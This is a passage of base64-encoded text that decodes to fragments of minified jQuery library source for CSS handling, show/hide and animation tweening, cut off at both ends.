HQpKSwgYi5pbm5lckhUTUwgPSAiPHRhYmxlPjx0cj48dGQ+PC90ZD48dGQ+dDwvdGQ+PC90cj48L3RhYmxlPiIsIGkgPSBiLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJ0ZCIpLCBpWzBdLnN0eWxlLmNzc1RleHQgPSAibWFyZ2luOjA7Ym9yZGVyOjA7cGFkZGluZzowO2Rpc3BsYXk6bm9uZSIsIGcgPSAwID09PSBpWzBdLm9mZnNldEhlaWdodCwgZyAmJiAoaVswXS5zdHlsZS5kaXNwbGF5ID0gIiIsIGlbMV0uc3R5bGUuZGlzcGxheSA9ICJub25lIiwgZyA9IDAgPT09IGlbMF0ub2Zmc2V0SGVpZ2h0KSwgYy5yZW1vdmVDaGlsZChkKSkgfSB9IH0oKSwgbS5zd2FwID0gZnVuY3Rpb24gKGEsIGIsIGMsIGQpIHsgdmFyIGUsIGYsIGcgPSB7fTsgZm9yIChmIGluIGIpIGdbZl0gPSBhLnN0eWxlW2ZdLCBhLnN0eWxlW2ZdID0gYltmXTsgZSA9IGMuYXBwbHkoYSwgZCB8fCBbXSk7IGZvciAoZiBpbiBiKSBhLnN0eWxlW2ZdID0gZ1tmXTsgcmV0dXJuIGUgfTsgdmFyIE1iID0gL2FscGhhXChbXildKlwpL2ksIE5iID0gL29wYWNpdHlccyo9XHMqKFteKV0qKS8sIE9iID0gL14obm9uZXx0YWJsZSg/IS1jW2VhXSkuKykvLCBQYiA9IG5ldyBSZWdFeHAoIl4oIiArIFMgKyAiKSguKikkIiwgImkiKSwgUWIgPSBuZXcgUmVnRXhwKCJeKFsrLV0pPSgiICsgUyArICIpIiwgImkiKSwgUmIgPSB7IHBvc2l0aW9uOiAiYWJzb2x1dGUiLCB2aXNpYmlsaXR5OiAiaGlkZGVuIiwgZGlzcGxheTogImJsb2NrIiB9LCBTYiA9IHsgbGV0dGVyU3BhY2luZzogIjAiLCBmb250V2VpZ2h0OiAiNDAwIiB9LCBUYiA9IFsiV2Via2l0IiwgIk8iLCAiTW96IiwgIm1zIl07IGZ1bmN0aW9uIFViKGEsIGIpIHsgaWYgKGIgaW4gYSkgcmV0dXJuIGI7IHZhciBjID0gYi5jaGFyQXQoMCkudG9VcHBlckNhc2UoKSArIGIuc2xpY2UoMSksIGQgPSBiLCBlID0gVGIubGVuZ3RoOyB3aGlsZSAoZS0tKSBpZiAoYiA9IFRiW2VdICsgYywgYiBpbiBhKSByZXR1cm4gYjsgcmV0dXJuIGQgfSBmdW5jdGlvbiBWYihhLCBiKSB7IGZvciAodmFyIGMsIGQsIGUsIGYgPSBbXSwgZyA9IDAsIGggPSBhLmxlbmd0aDsgaCA+IGc7IGcrKykgZCA9IGFbZ10sIGQuc3R5bGUgJiYgKGZbZ10gPSBtLl9kYXRhKGQsICJvbGRkaXNwbGF5IiksIGMgPSBkLnN0eWxlLmRpc3BsYXksIGIgPyAoZltnXSB8fCAibm9uZSIgIT09IGMgfHwgKGQuc3R5bGUuZGlzcGxheSA9ICIiKSwgIiIgPT09IGQuc3R5bGUuZGlzcGxheSAmJiBVKGQpICYmIChmW2ddID0gbS5fZGF0YShkLCAib2xkZGlzcGxheSIsIEZiKGQubm9kZU5hbWUpKSkpIDogKGUgPSBVKGQpLCAoYyAmJiAibm9uZSIgIT09IGMgfHwgIWUpICYmIG0uX2RhdGEoZCwgIm9sZGRpc3BsYXkiLCBlID8gYyA6IG0uY3NzKGQsICJkaXNwbGF5IikpKSk7IGZvciAoZyA9IDA7IGggPiBnOyBnKyspIGQgPSBhW2ddLCBkLnN0eWxlICYmIChiICYmICJub25lIiAhPT0gZC5zdHlsZS5kaXNwbGF5ICYmICIiICE9PSBkLnN0eWxlLmRpc3BsYXkgfHwgKGQuc3R5bGUuZGlzcGxheSA9IGIgPyBmW2ddIHx8ICIiIDogIm5vbmUiKSk7IHJldHVybiBhIH0gZnVuY3Rpb24gV2IoYSwgYiwgYykgeyB2YXIgZCA9IFBiLmV4ZWMoYik7IHJldHVybiBkID8gTWF0aC5tYXgoMCwgZFsxXSAtIChjIHx8IDApKSArIChkWzJdIHx8ICJweCIpIDogYiB9IGZ1bmN0aW9uIFhiKGEsIGIsIGMsIGQsIGUpIHsgZm9yICh2YXIgZiA9IGMgPT09IChkID8gImJvcmRlciIgOiAiY29udGVudCIpID8gNCA6ICJ3aWR0aCIgPT09IGIgPyAxIDogMCwgZyA9IDA7IDQgPiBmOyBmICs9IDIpICJtYXJnaW4iID09PSBjICYmIChnICs9IG0uY3NzKGEsIGMgKyBUW2ZdLCAhMCwgZSkpLCBkID8gKCJjb250ZW50IiA9PT0gYyAmJiAoZyAtPSBtLmNzcyhhLCAicGFkZGluZyIgKyBUW2ZdLCAhMCwgZSkpLCAibWFyZ2luIiAhPT0gYyAmJiAoZyAtPSBtLmNzcyhhLCAiYm9yZGVyIiArIFRbZl0gKyAiV2lkdGgiLCAhMCwgZSkpKSA6IChnICs9IG0uY3NzKGEsICJwYWRkaW5nIiArIFRbZl0sICEwLCBlKSwgInBhZGRpbmciICE9PSBjICYmIChnICs9IG0uY3NzKGEsICJib3JkZXIiICsgVFtmXSArICJXaWR0aCIsICEwLCBlKSkpOyByZXR1cm4gZyB9IGZ1bmN0aW9uIFliKGEsIGIsIGMpIHsgdmFyIGQgPSAhMCwgZSA9ICJ3aWR0aCIgPT09IGIgPyBhLm9mZnNldFdpZHRoIDogYS5vZmZzZXRIZWlnaHQsIGYgPSBJYihhKSwgZyA9IGsuYm94U2l6aW5nICYmICJib3JkZXItYm94IiA9PT0gbS5jc3MoYSwgImJveFNpemluZyIsICExLCBmKTsgaWYgKDAgPj0gZSB8fCBudWxsID09IGUpIHsgaWYgKGUgPSBKYihhLCBiLCBmKSwgKDAgPiBlIHx8IG51bGwgPT0gZSkgJiYgKGUgPSBhLnN0eWxlW2JdKSwgSGIudGVzdChlKSkgcmV0dXJuIGU7IGQgPSBnICYmIChrLmJveFNpemluZ1JlbGlhYmxlKCkgfHwgZSA9PT0gYS5zdHlsZVtiXSksIGUgPSBwYXJzZUZsb2F0KGUpIHx8IDAgfSByZXR1cm4gZSArIFhiKGEsIGIsIGMgfHwgKGcgPyAiYm9yZGVyIiA6ICJjb250ZW50IiksIGQsIGYpICsgInB4IiB9IG0uZXh0ZW5kKHsgY3NzSG9va3M6IHsgb3BhY2l0eTogeyBnZXQ6IGZ1bmN0aW9uIChhLCBiKSB7IGlmIChiKSB7IHZhciBjID0gSmIoYSwgIm9wYWNpdHkiKTsgcmV0dXJuICIiID09PSBjID8gIjEiIDogYyB9IH0gfSB9LCBjc3NOdW1iZXI6IHsgY29sdW1uQ291bnQ6ICEwLCBmaWxsT3BhY2l0eTogITAsIGZsZXhHcm93OiAhMCwgZmxleFNocmluazogITAsIGZvbnRXZWlnaHQ6ICEwLCBsaW5lSGVpZ2h0OiAhMCwgb3BhY2l0eTogITAsIG9yZGVyOiAhMCwgb3JwaGFuczogITAsIHdpZG93czogITAsIHpJbmRleDogITAsIHpvb206ICEwIH0sIGNzc1Byb3BzOiB7ICJmbG9hdCI6IGsuY3NzRmxvYXQgPyAiY3NzRmxvYXQiIDogInN0eWxlRmxvYXQiIH0sIHN0eWxlOiBmdW5jdGlvbiAoYSwgYiwgYywgZCkgeyBpZiAoYSAmJiAzICE9PSBhLm5vZGVUeXBlICYmIDggIT09IGEubm9kZVR5cGUgJiYgYS5zdHlsZSkgeyB2YXIgZSwgZiwgZywgaCA9IG0uY2FtZWxDYXNlKGIpLCBpID0gYS5zdHlsZTsgaWYgKGIgPSBtLmNzc1Byb3BzW2hdIHx8IChtLmNzc1Byb3BzW2hdID0gVWIoaSwgaCkpLCBnID0gbS5jc3NIb29rc1tiXSB8fCBtLmNzc0hvb2tzW2hdLCB2b2lkIDAgPT09IGMpIHJldHVybiBnICYmICJnZXQiIGluIGcgJiYgdm9pZCAwICE9PSAoZSA9IGcuZ2V0KGEsICExLCBkKSkgPyBlIDogaVtiXTsgaWYgKGYgPSB0eXBlb2YgYywgInN0cmluZyIgPT09IGYgJiYgKGUgPSBRYi5leGVjKGMpKSAmJiAoYyA9IChlWzFdICsgMSkgKiBlWzJdICsgcGFyc2VGbG9hdChtLmNzcyhhLCBiKSksIGYgPSAibnVtYmVyIiksIG51bGwgIT0gYyAmJiBjID09PSBjICYmICgibnVtYmVyIiAhPT0gZiB8fCBtLmNzc051bWJlcltoXSB8fCAoYyArPSAicHgiKSwgay5jbGVhckNsb25lU3R5bGUgfHwgIiIgIT09IGMgfHwgMCAhPT0gYi5pbmRleE9mKCJiYWNrZ3JvdW5kIikgfHwgKGlbYl0gPSAiaW5oZXJpdCIpLCAhKGcgJiYgInNldCIgaW4gZyAmJiB2b2lkIDAgPT09IChjID0gZy5zZXQoYSwgYywgZCkpKSkpIHRyeSB7IGlbYl0gPSBjIH0gY2F0Y2ggKGopIHsgfSB9IH0sIGNzczogZnVuY3Rpb24gKGEsIGIsIGMsIGQpIHsgdmFyIGUsIGYsIGcsIGggPSBtLmNhbWVsQ2FzZShiKTsgcmV0dXJuIGIgPSBtLmNzc1Byb3BzW2hdIHx8IChtLmNzc1Byb3BzW2hdID0gVWIoYS5zdHlsZSwgaCkpLCBnID0gbS5jc3NIb29rc1tiXSB8fCBtLmNzc0hvb2tzW2hdLCBnICYmICJnZXQiIGluIGcgJiYgKGYgPSBnLmdldChhLCAhMCwgYykpLCB2b2lkIDAgPT09IGYgJiYgKGYgPSBKYihhLCBiLCBkKSksICJub3JtYWwiID09PSBmICYmIGIgaW4gU2IgJiYgKGYgPSBTYltiXSksICIiID09PSBjIHx8IGMgPyAoZSA9IHBhcnNlRmxvYXQoZiksIGMgPT09ICEwIHx8IG0uaXNOdW1lcmljKGUpID8gZSB8fCAwIDogZikgOiBmIH0gfSksIG0uZWFjaChbImhlaWdodCIsICJ3aWR0aCJdLCBmdW5jdGlvbiAoYSwgYikgeyBtLmNzc0hvb2tzW2JdID0geyBnZXQ6IGZ1bmN0aW9uIChhLCBjLCBkKSB7IHJldHVybiBjID8gT2IudGVzdChtLmNzcyhhLCAiZGlzcGxheSIpKSAmJiAwID09PSBhLm9mZnNldFdpZHRoID8gbS5zd2FwKGEsIFJiLCBmdW5jdGlvbiAoKSB7IHJldHVybiBZYihhLCBiLCBkKSB9KSA6IFliKGEsIGIsIGQpIDogdm9pZCAwIH0sIHNldDogZnVuY3Rpb24gKGEsIGMsIGQpIHsgdmFyIGUgPSBkICYmIEliKGEpOyByZXR1cm4gV2IoYSwgYywgZCA/IFhiKGEsIGIsIGQsIGsuYm94U2l6aW5nICYmICJib3JkZXItYm94IiA9PT0gbS5jc3MoYSwgImJveFNpemluZyIsICExLCBlKSwgZSkgOiAwKSB9IH0gfSksIGsub3BhY2l0eSB8fCAobS5jc3NIb29rcy5vcGFjaXR5ID0geyBnZXQ6IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiBOYi50ZXN0KChiICYmIGEuY3VycmVudFN0eWxlID8gYS5jdXJyZW50U3R5bGUuZmlsdGVyIDogYS5zdHlsZS5maWx0ZXIpIHx8ICIiKSA/IC4wMSAqIHBhcnNlRmxvYXQoUmVnRXhwLiQxKSArICIiIDogYiA/ICIxIiA6ICIiIH0sIHNldDogZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMgPSBhLnN0eWxlLCBkID0gYS5jdXJyZW50U3R5bGUsIGUgPSBtLmlzTnVtZXJpYyhiKSA/ICJhbHBoYShvcGFjaXR5PSIgKyAxMDAgKiBiICsgIikiIDogIiIsIGYgPSBkICYmIGQuZmlsdGVyIHx8IGMuZmlsdGVyIHx8ICIiOyBjLnpvb20gPSAxLCAoYiA+PSAxIHx8ICIiID09PSBiKSAmJiAiIiA9PT0gbS50cmltKGYucmVwbGFjZShNYiwgIiIpKSAmJiBjLnJlbW92ZUF0dHJpYnV0ZSAmJiAoYy5yZW1vdmVBdHRyaWJ1dGUoImZpbHRlciIpLCAiIiA9PT0gYiB8fCBkICYmICFkLmZpbHRlcikgfHwgKGMuZmlsdGVyID0gTWIudGVzdChmKSA/IGYucmVwbGFjZShNYiwgZSkgOiBmICsgIiAiICsgZSkgfSB9KSwgbS5jc3NIb29rcy5tYXJnaW5SaWdodCA9IExiKGsucmVsaWFibGVNYXJnaW5SaWdodCwgZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIGIgPyBtLnN3YXAoYSwgeyBkaXNwbGF5OiAiaW5saW5lLWJsb2NrIiB9LCBKYiwgW2EsICJtYXJnaW5SaWdodCJdKSA6IHZvaWQgMCB9KSwgbS5lYWNoKHsgbWFyZ2luOiAiIiwgcGFkZGluZzogIiIsIGJvcmRlcjogIldpZHRoIiB9LCBmdW5jdGlvbiAoYSwgYikgeyBtLmNzc0hvb2tzW2EgKyBiXSA9IHsgZXhwYW5kOiBmdW5jdGlvbiAoYykgeyBmb3IgKHZhciBkID0gMCwgZSA9IHt9LCBmID0gInN0cmluZyIgPT0gdHlwZW9mIGMgPyBjLnNwbGl0KCIgIikgOiBbY107IDQgPiBkOyBkKyspIGVbYSArIFRbZF0gKyBiXSA9IGZbZF0gfHwgZltkIC0gMl0gfHwgZlswXTsgcmV0dXJuIGUgfSB9LCBHYi50ZXN0KGEpIHx8IChtLmNzc0hvb2tzW2EgKyBiXS5zZXQgPSBXYikgfSksIG0uZm4uZXh0ZW5kKHsgY3NzOiBmdW5jdGlvbiAoYSwgYikgeyByZXR1cm4gVih0aGlzLCBmdW5jdGlvbiAoYSwgYiwgYykgeyB2YXIgZCwgZSwgZiA9IHt9LCBnID0gMDsgaWYgKG0uaXNBcnJheShiKSkgeyBmb3IgKGQgPSBJYihhKSwgZSA9IGIubGVuZ3RoOyBlID4gZzsgZysrKSBmW2JbZ11dID0gbS5jc3MoYSwgYltnXSwgITEsIGQpOyByZXR1cm4gZiB9IHJldHVybiB2b2lkIDAgIT09IGMgPyBtLnN0eWxlKGEsIGIsIGMpIDogbS5jc3MoYSwgYikgfSwgYSwgYiwgYXJndW1lbnRzLmxlbmd0aCA+IDEpIH0sIHNob3c6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIFZiKHRoaXMsICEwKSB9LCBoaWRlOiBmdW5jdGlvbiAoKSB7IHJldHVybiBWYih0aGlzKSB9LCB0b2dnbGU6IGZ1bmN0aW9uIChhKSB7IHJldHVybiAiYm9vbGVhbiIgPT0gdHlwZW9mIGEgPyBhID8gdGhpcy5zaG93KCkgOiB0aGlzLmhpZGUoKSA6IHRoaXMuZWFjaChmdW5jdGlvbiAoKSB7IFUodGhpcykgPyBtKHRoaXMpLnNob3coKSA6IG0odGhpcykuaGlkZSgpIH0pIH0gfSk7IGZ1bmN0aW9uIFpiKGEsIGIsIGMsIGQsIGUpIHsgcmV0dXJuIG5ldyBaYi5wcm90b3R5cGUuaW5pdChhLCBiLCBjLCBkLCBlKSB9IG0uVHdlZW4gPSBaYiwgWmIucHJvdG90eXBlID0gew0KICAgICAgICBjb25zdHJ1Y3RvcjogWmIsIGluaXQ6IGZ1bmN0aW9uIChhLCBiLCBjLCBkLCBlLCBmKSB7DQogICAgICAgICAgICB0aGlzLmVsZW0gPSBhLCB0aGlzLnByb3AgPSBjLCB0aGlzLmVhc2luZyA9IGUgfHwgInN3aW5nIiwgdGhpcy5vcHRpb25zID0gYiwgdGhpcy5zdGFydCA9IHRoaXMubm93ID0gdGhpcy5jdXIoKSwgdGhpcy5lbmQgPSBkLCB0aGlzLnVuaXQgPSBmIHx8IChtLmNzc051bWJlcltjXSA/ICIiIDogInB4IikNCiAgICAgICAgfSwgY3VyOiBmdW5jdGlvbiAoKSB7IHZhciBhID0gWmIucHJvcEhvb2tzW3RoaXMucHJvcF07IHJldHVybiBhICYmIGEuZ2V0ID8gYS5nZXQodGhpcykgOiBaYi5wcm9wSG9va3MuX2RlZmF1bHQuZ2V0KHRoaXMpIH0sIHJ1bjogZnVuY3Rpb24gKGEpIHsgdmFyIGIsIGMgPSBaYi5wcm9wSG9va3NbdGhpcy5wcm9wXTsgcmV0dXJuIHRoaXMucG9zID0gYiA9IHRoaXMub3B0aW9ucy5kdXJhdGlvbiA/IG0uZWFzaW5nW3RoaXMuZWFzaW5nXShhLCB0aGlzLm9wdGlvbnMuZHVyYXRpb24gKiBhLCAwLCAxLCB0aGlzLm9wdGlvbnMuZHVyYXRpb24pIDogYSwgdGhpcy5ub3cgPSAodGhpcy5lbmQgLSB0aGlzLnN0YXJ0KSAqIGIgKyB0aGlzLnN0YXJ0LCB0aGlzLm9wdGlvbnMuc3RlcCAmJiB0aGlzLm9wdGlvbnMuc3RlcC5jYWxsKHRoaXMuZWxlbSwgdGhpcy5ub3csIHRoaXMpLCBjICYmIGMuc2V0ID8gYy5zZXQodGhpcykgOiBaYi5wcm9wSG9va3MuX2RlZmF1bHQuc2V0KHRoaXMpLCB0aGlzIH0NCiAgICB9LCBaYi5wcm90b3R5cGUuaW5pdC5wcm90b3R5cGUgPSBaYi5wcm90b3R5cGUsIFpiLnByb3BIb29rcyA9IHsgX2RlZmF1bHQ6IHsgZ2V0OiBmdW5jdGlvbiAoYSkgeyB2YXIgYjsgcmV0dXJuIG51bGwgPT0gYS5lbGVtW2EucHJvcF0gfHwgYS5lbGVtLnN0eWxlICYmIG51bGwgIT0gYS5lbGVtLnN0eWxlW2EucHJvcF0gPyAoYiA9IG0uY3NzKGEuZWxlbSwgYS5wcm9wLCAiIiksIGIgJiYgImF1dG8iICE9PSBiID8gYiA6IDApIDogYS5lbGVtW2EucHJvcF0gfSwgc2V0OiBmdW5jdGlvbiAoYSkgeyBtLmZ4LnN0ZXBbYS5wcm9wXSA/IG0uZnguc3RlcFthLnByb3BdKGEpIDogYS5lbGVtLnN0eWxlICYmIChudWxsICE9IGEuZWxlbS5zdHlsZVttLmNzc1Byb3BzW2EucHJvcF1dIHx8IG0uY3NzSG9va3NbYS5wcm9wXSkgPyBtLnN0eWxlKGEuZWxlbSwgYS5wcm9wLCBhLm5vdyArIGEudW5pdCkgOiBhLmVsZW1bYS5wcm9wXSA9IGEubm93IH0gfSB9LCBaYi5wcm9wSG9va3Muc2Nyb2xsVG9wID0gWmIucHJvcEhvb2tzLnNjcm9sbExlZnQgPSB7IHNldDogZnVuY3Rpb24gKGEpIHsgYS5lbGVtLm5vZGVUeXBlICYmIGEuZWxlbS5wYXJlbnROb2RlICYmIChhLmVsZW1bYS5wcm9wXSA9IGEubm93KSB9IH0sIG0uZWFzaW5nID0geyBsaW5lYXI6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBhIH0sIHN3aW5nOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gLjUgLSBNYXRoLmNvcyhhICogTWF0aC5QSSkgLyAyIH0gfSwgbS5meCA9IFpiLnByb3RvdHlwZS5pbml0LCBtLmZ4LnN0ZXAgPSB7fTsgdmFyICRiLCBfYiwgYWMgPSAvXig/OnRvZ2dsZXxzaG93fGhpZGUpJC8sIGJjID0gbmV3IFJlZ0V4cCgiXig/OihbKy1dKT18KSgiICsgUyArICIpKFthLXolXSopJCIsICJpIiksIGNjID0gL3F1ZXVlSG9va3MkLywgZGMgPSBbaWNdLCBlYyA9IHsgIioiOiBbZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMgPSB0aGlzLmNyZWF0ZVR3ZWVuKGEsIGIpLCBkID0gYy5jdXIoKSwgZSA9IGJjLmV4ZWMoYiksIGYgPSBlICYmIGVbM10gfHwgKG0uY3NzTnVtYmVyW2FdID8gIiIgOiAicHgiKSwgZyA9IChtLmNzc051bWJlclthXSB8fCAicHgiICE9PSBmICYmICtkKSAmJiBiYy5leGVjKG0uY3NzKGMuZWxlbSwgYSkpLCBoID0gMSwgaSA9IDIwOyBpZiAoZyAmJiBnWzNdICE9PSBmKSB7IGYgPSBmIHx8IGdbM10sIGUgPSBlIHx8IFtdLCBnID0gK2QgfHwgMTsgZG8gaCA9IGggfHwgIi41IiwgZyAvPSBoLCBtLnN0eWxlKGMuZWxlbSwgYSwgZyArIGYpOyB3aGlsZSAoaCAhPT0gKGggPSBjLmN1cigpIC8gZCkgJiYgMSAhPT0gaCAmJiAtLWkpIH0gcmV0dXJuIGUgJiYgKGcgPSBjLnN0YXJ0ID0gK2cgfHwgK2QgfHwgMCwgYy51bml0ID0gZiwgYy5lbmQgPSBlWzFdID8gZyArIChlWzFdICsgMSkgKiBlWzJdIDogK2VbMl0pLCBjIH1dIH07IGZ1bmN0aW9uIGZjKCkgeyByZXR1cm4gc2V0VGltZW91dChmdW5jdGlvbiAoKSB7ICRiID0gdm9pZCAwIH0pLCAkYiA9IG0ubm93KCkgfSBmdW5jdGlvbiBnYyhhLCBiKSB7IHZhciBjLCBkID0geyBoZWlnaHQ6IGEgfSwgZSA9IDA7IGZvciAoYiA9IGIgPyAxIDogMDsgNCA+IGU7IGUgKz0gMiAtIGIpIGMgPSBUW2VdLCBkWyJtYXJnaW4iICsgY10gPSBkWyJwYWRkaW5nIiArIGNdID0gYTsgcmV0dXJuIGIgJiYgKGQub3BhY2l0eSA9IGQud2lkdGggPSBhKSwgZCB9IGZ1bmN0aW9uIGhjKGEsIGIsIGMpIHsgZm9yICh2YXIgZCwgZSA9IChlY1tiXSB8fCBbXSkuY29uY2F0KGVjWyIqIl0pLCBmID0gMCwgZyA9IGUubGVuZ3RoOyBnID4gZjsgZisrKSBpZiAoZCA9IGVbZl0uY2FsbChjLCBiLCBhKSkgcmV0dXJuIGQgfSBmdW5jdGlvbiBpYyhhLCBiLCBjKSB7IHZhciBkLCBlLCBmLCBnLCBoLCBpLCBqLCBsLCBuID0gdGhpcywgbyA9IHt9LCBwID0gYS5zdHlsZSwgcSA9IGEubm9kZVR5cGUgJiYgVShhKSwgciA9IG0uX2RhdGEoYSwgImZ4c2hvdyIpOyBjLnF1ZXVlIHx8IChoID0gbS5fcXVldWVIb29rcyhhLCAiZngiKSwgbnVsbCA9PSBoLnVucXVldWVkICYmIChoLnVucXVldWVkID0gMCwgaSA9IGguZW1wdHkuZmlyZSwgaC5lbXB0eS5maXJlID0gZnVuY3Rpb24gKCkgeyBoLnVucXVldWVkIHx8IGkoKSB9KSwgaC51bnF1ZXVlZCsrLCBuLmFsd2F5cyhmdW5jdGlvbiAoKSB7IG4uYWx3YXlzKGZ1bmN0aW9uICgpIHsgaC51bnF1ZXVlZC0tLCBtLnF1ZXVlKGEsICJmeCIpLmxlbmd0aCB8fCBoLmVtcHR5LmZpcmUoKSB9KSB9KSksIDEgPT09IGEubm9kZVR5cGUgJiYgKCJoZWlnaHQiIGluIGIgfHwgIndpZHRoIiBpbiBiKSAmJiAoYy5vdmVyZmxvdyA9IFtwLm92ZXJmbG93LCBwLm92ZXJmbG93WCwgcC5vdmVyZmxvd1ldLCBqID0gbS5jc3MoYSwgImRpc3BsYXkiKSwgbCA9ICJub25lIiA9PT0gaiA/IG0uX2RhdGEoYSwgIm9sZGRpc3BsYXkiKSB8fCBGYihhLm5vZGVOYW1lKSA6IGosICJpbmxpbmUiID09PSBsICYmICJub25lIiA9PT0gbS5jc3MoYSwgImZsb2F0IikgJiYgKGsuaW5saW5lQmxvY2tOZWVkc0xheW91dCAmJiAiaW5saW5lIiAhPT0gRmIoYS5ub2RlTmFtZSkgPyBwLnpvb20gPSAxIDogcC5kaXNwbGF5ID0gImlubGluZS1ibG9jayIpKSwgYy5vdmVyZmxvdyAmJiAocC5vdmVyZmxvdyA9ICJoaWRkZW4iLCBrLnNocmlua1dyYXBCbG9ja3MoKSB8fCBuLmFsd2F5cyhmdW5jdGlvbiAoKSB7IHAub3ZlcmZsb3cgPSBjLm92ZXJmbG93WzBdLCBwLm92ZXJmbG93WCA9IGMub3ZlcmZsb3dbMV0sIHAub3ZlcmZsb3dZID0gYy5vdmVyZmxvd1syXSB9KSk7IGZvciAoZCBpbiBiKSBpZiAoZSA9IGJbZF0sIGFjLmV4ZWMoZSkpIHsgaWYgKGRlbGV0ZSBiW2RdLCBmID0gZiB8fCAidG9nZ2xlIiA9PT0gZSwgZSA9PT0gKHEgPyAiaGlkZSIgOiAic2hvdyIpKSB7IGlmICgic2hvdyIgIT09IGUgfHwgIXIgfHwgdm9pZCAwID09PSByW2RdKSBjb250aW51ZTsgcSA9ICEwIH0gb1tkXSA9IHIgJiYgcltkXSB8fCBtLnN0eWxlKGEsIGQpIH0gZWxzZSBqID0gdm9pZCAwOyBpZiAobS5pc0VtcHR5T2JqZWN0KG8pKSAiaW5saW5lIiA9PT0gKCJub25lIiA9PT0gaiA/IEZiKGEubm9kZU5hbWUpIDogaikgJiYgKHAuZGlzcGxheSA9IGopOyBlbHNlIHsgciA/ICJoaWRkZW4iIGluIHIgJiYgKHEgPSByLmhpZGRlbikgOiByID0gbS5fZGF0YShhLCAiZnhzaG93Iiwge30pLCBmICYmIChyLmhpZGRlbiA9ICFxKSwgcSA/IG0oYSkuc2hvdygpIDogbi5kb25lKGZ1bmN0aW9uICgpIHsgbShhKS5oaWRlKCkgfSksIG4uZG9uZShmdW5jdGlvbiAoKSB7IHZhciBiOyBtLl9yZW1vdmVEYXRhKGEsICJmeHNob3ciKTsgZm9yIChiIGluIG8pIG0uc3R5bGUoYSwgYiwgb1tiXSkgfSk7IGZvciAoZCBpbiBvKSBnID0gaGMocSA/IHJbZF0gOiAwLCBkLCBuKSwgZCBpbiByIHx8IChyW2RdID0gZy5zdGFydCwgcSAmJiAoZy5lbmQgPSBnLnN0YXJ0LCBnLnN0YXJ0ID0gIndpZHRoIiA9PT0gZCB8fCAiaGVpZ2h0IiA9PT0gZCA/IDEgOiAwKSkgfSB9IGZ1bmN0aW9uIGpjKGEsIGIpIHsgdmFyIGMsIGQsIGUsIGYsIGc7IGZvciAoYyBpbiBhKSBpZiAoZCA9IG0uY2FtZWxDYXNlKGMpLCBlID0gYltkXSwgZiA9IGFbY10sIG0uaXNBcnJheShmKSAmJiAoZSA9IGZbMV0sIGYgPSBhW2NdID0gZlswXSksIGMgIT09IGQgJiYgKGFbZF0gPSBmLCBkZWxldGUgYVtjXSksIGcgPSBtLmNzc0hvb2tzW2RdLCBnICYmICJleHBhbmQiIGluIGcpIHsgZiA9IGcuZXhwYW5kKGYpLCBkZWxldGUgYVtkXTsgZm9yIChjIGluIGYpIGMgaW4gYSB8fCAoYVtjXSA9IGZbY10sIGJbY10gPSBlKSB9IGVsc2UgYltkXSA9IGUgfSBmdW5jdGlvbiBrYyhhLCBiLCBjKSB7IHZhciBkLCBlLCBmID0gMCwgZyA9IGRjLmxlbmd0aCwgaCA9IG0uRGVmZXJyZWQoKS5hbHdheXMoZnVuY3Rpb24gKCkgeyBkZWxldGUgaS5lbGVtIH0pLCBpID0gZnVuY3Rpb24gKCkgeyBpZiAoZSkgcmV0dXJuICExOyBmb3IgKHZhciBiID0gJGIgfHwgZmMoKSwgYyA9IE1hdGgubWF4KDAsIGouc3RhcnRUaW1lICsgai5kdXJhdGlvbiAtIGIpLCBkID0gYyAvIGouZHVyYXRpb24gfHwgMCwgZiA9IDEgLSBkLCBnID0gMCwgaSA9IGoudHdlZW5zLmxlbmd0aDsgaSA+IGc7IGcrKykgai50d2VlbnNbZ10ucnVuKGYpOyByZXR1cm4gaC5ub3RpZnlXaXRoKGEsIFtqLCBmLCBjXSksIDEgPiBmICYmIGkgPyBjIDogKGgucmVzb2x2ZVdpdGgoYSwgW2pdKSwgITEpIH0sIGogPSBoLnByb21pc2UoeyBlbGVtOiBhLCBwcm9wczogbS5leHRlbmQoe30sIGIpLCBvcHRzOiBtLmV4dGVuZCghMCwgeyBzcGVjaWFsRWFzaW5nOiB7fSB9LCBjKSwgb3JpZ2luYWxQcm9wZXJ0aWVzOiBiLCBvcmlnaW5hbE9wdGlvbnM6IGMsIHN0YXJ0VGltZTogJGIgfHwgZmMoKSwgZHVyYXRpb246IGMuZHVyYXRpb24sIHR3ZWVuczogW10sIGNyZWF0ZVR3ZWVuOiBmdW5jdGlvbiAoYiwgYykgeyB2YXIgZCA9IG0uVHdlZW4oYSwgai5vcHRzLCBiLCBjLCBqLm9wdHMuc3BlY2lhbEVhc2luZ1tiXSB8fCBqLm9wdHMuZWFzaW5nKTsgcmV0dXJuIGoudHdlZW5zLnB1c2goZCksIGQgfSwgc3RvcDogZnVuY3Rpb24gKGIpIHsgdmFyIGMgPSAwLCBkID0gYiA/IGoudHdlZW5zLmxlbmd0aCA6IDA7IGlmIChlKSByZXR1cm4gdGhpczsgZm9yIChlID0gITA7IGQgPiBjOyBjKyspIGoudHdlZW5zW2NdLnJ1bigxKTsgcmV0dXJuIGIgPyBoLnJlc29sdmVXaXRoKGEsIFtqLCBiXSkgOiBoLnJlamVjdFdpdGgoYSwgW2osIGJdKSwgdGhpcyB9IH0pLCBrID0gai5wcm9wczsgZm9yIChqYyhrLCBqLm9wdHMuc3BlY2lhbEVhc2luZykgOyBnID4gZjsgZisrKSBpZiAoZCA9IGRjW2ZdLmNhbGwoaiwgYSwgaywgai5vcHRzKSkgcmV0dXJuIGQ7IHJldHVybiBtLm1hcChrLCBoYywgaiksIG0uaXNGdW5jdGlvbihqLm9wdHMuc3RhcnQpICYmIGoub3B0cy5zdGFydC5jYWxsKGEsIGopLCBtLmZ4LnRpbWVyKG0uZXh0ZW5kKGksIHsgZWxlbTogYSwgYW5pbTogaiwgcXVldWU6IGoub3B0cy5xdWV1ZSB9KSksIGoucHJvZ3Jlc3Moai5vcHRzLnByb2dyZXNzKS5kb25lKGoub3B0cy5kb25lLCBqLm9wdHMuY29tcGxldGUpLmZhaWwoai5vcHRzLmZhaWwpLmFsd2F5cyhqLm9wdHMuYWx3YXlzKSB9IG0uQW5pbWF0aW9uID0gbS5leHRlbmQoa2MsIHsgdHdlZW5lcjogZnVuY3Rpb